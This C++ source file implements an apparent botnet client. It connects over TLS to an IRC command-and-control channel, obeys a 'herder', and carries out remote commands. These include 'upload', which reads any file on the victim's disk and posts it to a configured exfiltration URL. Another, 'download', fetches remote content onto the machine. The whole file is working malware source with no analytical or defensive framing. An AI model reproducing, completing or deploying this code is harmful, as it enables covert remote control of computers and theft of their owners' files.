#include "SecureSocket.hpp"
#include "IrcClient.hpp"
#include "Random.hpp"
#include "Utils.hpp"
#include "SystemInfo.hpp"
#include "DataLoader.hpp"
#include "Lib/json.hpp"
#include "HttpClient.hpp"
#include "HttpUtils.hpp"
#include "Processes.hpp"
#ifndef _WIN32
    #include "Shims.hpp"
#endif
#include <thread>
#include <fstream>

using namespace Legit;
using json = nlohmann::json;
using namespace std;

class ICommandChannel
{
public:
    virtual ~ICommandChannel() { }

    virtual void Send(string message) = 0;
    virtual void Send(string message, string recipient) = 0;
    virtual string Receive() = 0;
};

class IrcCommandChannel : public ICommandChannel
{
public:
    IrcCommandChannel(string host, string port, string channel, string nick, string herder, string pem);
    virtual ~IrcCommandChannel();

    virtual void Send(string message) override;
    virtual void Send(string message, string recipient) override;
    virtual string Receive() override;

private:
    IrcClient client_;
    string channel_;
    string herder_;
};

IrcCommandChannel::~IrcCommandChannel()
{
    client_.Send("QUIT out\r\n");
}

IrcCommandChannel::IrcCommandChannel(string host, string port, string channel, string nick, string herder, string pem) :
    channel_(channel),
    herder_(herder),
    client_(make_unique<SecureSocket>(host, port, make_unique<CertStore>(pem, false), 500), nick)
{
    while (!client_.ReceivedFirstPing())
    {
        client_.Receive();
    }
    client_.Send("JOIN " + channel + "\r\n");
}

void IrcCommandChannel::Send(string message)
{
    Send(message, herder_ == "" ? channel_ : herder_);
}

void IrcCommandChannel::Send(string message, string recipient)
{
    client_.Send("PRIVMSG " + recipient + " :" + message + "\r\n");
}

string IrcCommandChannel::Receive()
{
    auto message = client_.Receive();
    if (message.command == "PRIVMSG")
    { 
        if (message.params[0] == channel_ || message.GetReturnName() == herder_)
            return message.params[1];
    }

    return "";
}

unique_ptr<ISocket> SocketFactory(string scheme, string host)
{
    if (scheme == "http://")
        return make_unique<Socket>(host, "80");
    else if (scheme == "https://")
        return make_unique<SecureSocket>(host, "443", make_unique<CertStore>());
    else
        return nullptr;
}

void MainThread(unsigned int parentThreadId)
{
    string configPath = Processes::GetExecutablePath() + "\\config.json";
    json config;
    ifstream configFile(configPath, ios::in);
    configFile >> config;

    RandomGenerator rng;

    string host = config["host"];
    string port = config["port"];
    string channel = config["channel"];
    string herder = config["herder"];
    string exfil = config["exfil"];
    string nick = rng.GetString(Legit::ALPHA_MIXED, 1) + rng.GetString(Legit::ALPHA_NUMERIC_MIXED, 15);

    auto exfilUrlParts = HttpUtils::SplitUrl(exfil);
    string exfilScheme = exfilUrlParts[0];
    string exfilHost = exfilUrlParts[1];
    string exfilPath = exfilUrlParts[2];

    string certPath = Processes::GetExecutablePath() + "\\cc.cer";
    vector<char> pemBytes;
    DataLoader::LoadFromFile(Utils::WideFromString(certPath), pemBytes);
    string cert(pemBytes.begin(), pemBytes.end());

    unique_ptr<ICommandChannel> cc = make_unique<IrcCommandChannel>(host, port, channel, nick, herder, cert);

    while (true)
    {
        auto message = cc->Receive();
        if (message == "quit")
        {
            #ifdef _WIN32
            ::PostThreadMessage(parentThreadId, WM_QUIT, 0, 0);
            #endif
            break;
        }
        else if (message == "info")
        {
            SystemInfo info;
            cc->Send(Utils::StringFromWide(info.GetPlatform()) + " | " + Utils::StringFromWide(info.GetVersion()));
        }
        else if (message.substr(0, 7) == "upload ")
        {
            // Load file from disk
            wstring path = Utils::WideFromString(message.substr(7));
            vector<char> fileContents;
            
            if (DataLoader::LoadFromFile(path, fileContents))
            {
                string narrowPath = Utils::StringFromWide(path);
                auto filenameParts = Utils::Split(narrowPath, "\\");

                // Dump it out to exfil
                string boundary;
                unordered_map<string, string> fields;
                unordered_map<string, HttpFile> files;
                files.insert(make_pair("f0", HttpFile(filenameParts.back(), fileContents)));

                auto body = HttpUtils::CreateBody(fields, files, boundary);
                HttpClient client(SocketFactory(exfilScheme, exfilHost));
                auto response = client.Post(exfilPath + "?c=" + nick, body, "multipart/form-data; boundary=" + boundary);

                cc->Send("Done (" + response.statusCode + ")");
            }
            else
            {
                cc->Send("Fail (couldn't load local file)");
            }
        }
        else if (message.substr(0, 9) == "download ")
        {
            string url = message.substr(9);
            auto urlParts = HttpUtils::SplitUrl(url);
            HttpClient client(SocketFactory(urlParts[0], urlParts[1]));

            auto response = client.Get(urlParts[2]);
            
            DataLoader::DumpToFile(L"c:\\lib\\test.bin", response.body);
        }
        else if (message == "hello")
            cc->Send("hello");
    }
}

#ifdef _WIN32
int WINAPI WinMain(HINSTANCE instance, HINSTANCE prevInstance, LPSTR commandLine, int show)
{
    auto foo = Processes::GetCurrentProcesses();

    DWORD threadId = ::GetCurrentThreadId();
    thread t(MainThread, threadId);

    MSG message;
    while (::GetMessage(&message, nullptr, 0, 0) != 0)
    {
        if (message.message == WM_QUIT)
            break;

        ::TranslateMessage(&message);
        ::DispatchMessage(&message);
    }

    t.join();

    Socket::Shutdown();

    return 0;
}
#else
int main(int argc, char **argv)
{
    MainThread(0);

    return 0;
}
#endif

